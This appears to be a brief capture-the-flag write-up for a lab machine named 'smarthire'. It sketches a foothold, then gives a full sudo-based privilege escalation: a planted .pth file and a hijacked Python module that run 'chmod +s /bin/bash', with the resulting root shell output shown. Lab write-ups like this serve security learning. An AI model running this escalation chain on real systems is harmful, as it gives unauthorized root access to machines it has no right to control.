#### foothold
ffuf subdomain 
vuln of applicaitons get reverse shell

#### Priv Es
write authorized_keys get persistence

`svcweb@smarthire:~/.ssh$ sudo -l`
```
sudo -l
Matching Defaults entries for svcweb on smarthire:
    env_reset,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User svcweb may run the following commands on smarthire:
    (root) NOPASSWD: /usr/bin/python3.10 /opt/tools/mlflow_ctl/mlflowctl.py *
```
```

`ls -la /opt/tools/mlflow_ctl/mlflowctl.py`
```
-rwxr-xr-- 1 root root 1080 Feb 19  2026 /opt/tools/mlflow_ctl/mlflowctl.py
```

`cat /opt/tools/mlflow_ctl/mlflowctl.py`
```
#!/usr/bin/env python3


from pathlib import Path
import sys
import site

BASE_DIR = Path(__file__).resolve().parent
PLUGINS_DIR = BASE_DIR / "plugins"

# make plugins importable
for path in PLUGINS_DIR.iterdir():
    if path.is_dir():
        site.addsitedir(str(path))

def print_usage():
    print("Usage: mlflowctl.py [status|backup-models|restart]")
    sys.exit(1)

def main():
    import mlflow_actions, backup_models

    if len(sys.argv) < 2:
        print_usage()

    action = sys.argv[1]

    if action == "status":
        mlflow_actions.check_status()
  <SNIP>
```

```
The content of evil.pth is an executable Python Path Configuration (.pth) file.

When a directory containing a .pth file is added using site.addsitedir(), Python doesn't just read it as a list of path strings—it evaluates lines starting with import as executable Python code.
```
since "PLUGINS_DIR = BASE_DIR / "plugins" 
```
contains the /opt/tools/mlflow_ctl/plugins/dev folder:

    - site.addsitedir('/opt/tools/mlflow_ctl/plugins/dev') runs.
    - Python scans /opt/tools/mlflow_ctl/plugins/dev for .pth files and finds evil.pth.
    - Because the line in evil.pth starts with import, Python immediately runs import sys; sys.path.insert(0, '/opt/tools/mlflow_ctl/dev') during runtime startup.
    - /opt/tools/mlflow_ctl/dev gets prepended to the front of sys.path (index 0).
```
`svcweb@smarthire:/opt/tools/mlflow_ctl/plugins/dev$ cat evil.pth `
```
import sys; sys.path.insert(0, '/opt/tools/mlflow_ctl/plugins/dev')
```
`svcweb@smarthire:/opt/tools/mlflow_ctl/plugins/dev$ cat mlflow_actions.py `
```
import os

def check_status():
    os.system("chmod +s /bin/bash")
```
`sudo /usr/bin/python3.10 /opt/tools/mlflow_ctl/mlflowctl.py status`

```
svcweb@smarthire:/opt/tools/mlflow_ctl/plugins/dev$ ls -la /bin/bash
-rwsr-sr-x 1 root root 1396520 Mar 14  2024 /bin/bash

svcweb@smarthire:/opt/tools/mlflow_ctl/plugins/dev$ /bin/bash -p
bash-5.1# id
uid=1000(svcweb) gid=1000(svcweb) euid=0(root) egid=0(root) groups=0(root),1000(svcweb),1001(mlflowweb),1002(devs)
```




